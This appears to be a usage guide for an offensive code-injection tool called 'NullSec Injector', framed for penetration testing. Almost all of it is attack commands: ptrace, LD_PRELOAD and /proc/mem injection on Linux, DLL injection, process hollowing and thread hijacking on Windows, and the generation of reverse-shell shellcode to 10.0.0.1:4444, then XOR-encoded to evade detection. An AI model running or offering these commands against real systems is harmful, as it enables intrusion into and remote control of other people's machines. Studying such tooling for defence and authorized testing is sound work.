# NullSec Injector Usage Guide

## Overview
Code injection toolkit for security research and penetration testing.

## Techniques

### Process Injection (Linux)
```bash
# ptrace injection
nullsec-inject --method ptrace --pid 1234 --payload shellcode.bin

# LD_PRELOAD
nullsec-inject --method ldpreload --target /usr/bin/app --lib evil.so

# /proc/mem write
nullsec-inject --method procmem --pid 1234 --addr 0x400000 --payload code.bin
```

### Process Injection (Windows)
```bash
# DLL injection
nullsec-inject --method dll --pid 1234 --dll payload.dll

# Process hollowing
nullsec-inject --method hollow --target notepad.exe --payload evil.exe

# Thread hijacking
nullsec-inject --method thread --pid 1234 --shellcode sc.bin
```

### Shellcode Execution
```bash
# Generate shellcode
nullsec-inject --generate --type reverse --host 10.0.0.1 --port 4444

# Encode shellcode
nullsec-inject --encode --method xor --key 0x41 --input raw.bin

# Test in sandbox
nullsec-inject --sandbox --shellcode encoded.bin
```

## Safety Features
- Sandbox mode for testing
- Process whitelist/blacklist
- Automatic cleanup
- Logging and audit trail

## Legal Notice
For authorized security testing only.
